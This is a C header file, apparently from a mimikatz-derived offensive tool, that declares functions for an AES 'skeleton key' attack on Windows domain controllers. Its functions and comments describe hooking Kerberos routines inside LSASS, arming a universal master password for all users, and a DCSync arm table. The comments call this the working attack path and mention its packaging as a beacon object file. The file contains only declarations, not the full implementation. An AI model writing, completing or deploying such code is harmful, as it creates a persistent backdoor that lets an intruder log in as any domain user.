/* kuhl_m_skeleton_aes.h — AES all-users skeleton key (adaptive derive-layer
 * input substitution + DCSync arm table), ported 1:1 from the verified
 * standalone toolchain (standalone/skelinstall_derive.cpp +
 * standalone/skelread_derive.cpp, hooks hook_aes_derive.c / hook_aes_decrypt2.c).
 *
 * This is the WORKING path (§101). The old RC4/kdcsvc hooks in
 * kuhl_m_skeleton.c are superseded and no longer wired into the BOF.
 */
#pragma once
#include "globals.h"
#include "kull_m_output.h"
#include "../../modules/kull_m_process.h"
#include "../../modules/kull_m_memory.h"

/* install the two derive hooks + the decrypt hook into LSASS's Kerb3961.dll
 * vtable slots and allocate the shared SKD_CTX. On success *pCtxAddr receives
 * the CTX address (pass it to the control functions below). */
NTSTATUS kuhl_m_skeleton_aes_install(PVOID *pCtxAddr);

/* v8 one-shot: install the hooks AND arm with the universal master key derived
 * from `password` (PBKDF2-HMAC-SHA1(password, UPPER(realm), 4096, 32)). Returns
 * the CTX address in *pCtxAddr. No DCSync / arm table needed. */
NTSTATUS kuhl_m_skeleton_aes_install_pw(LPCSTR password, PVOID *pCtxAddr);

/* control — every function reopens LSASS, reads/writes the CTX at ctxAddr. */
NTSTATUS kuhl_m_skeleton_aes_status(PVOID ctxAddr);
NTSTATUS kuhl_m_skeleton_aes_mode(PVOID ctxAddr, int mode);
NTSTATUS kuhl_m_skeleton_aes_setmaster(PVOID ctxAddr, LPCSTR masterHex);
